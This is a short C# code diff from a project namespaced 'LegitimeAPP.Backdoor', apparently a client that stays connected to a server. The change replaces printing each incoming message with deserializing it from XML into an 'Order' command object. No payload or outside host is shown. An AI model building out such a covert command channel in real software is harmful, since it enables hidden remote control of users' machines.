@@ -116,7 +116,8 @@ namespace LegitimeAPP.Backdoor {
 
                 if ( IsConnected ) {
                     string message = GetIncomingMessage() ;
-                    Console.WriteLine("Message : "+message) ;
+                    Order ord = Data<Order>.XmlToData(message) ;
+                     
                 } else {
                     Console.WriteLine("Le serveur ne répond plus. Déconnection...") ; 
                      break ;
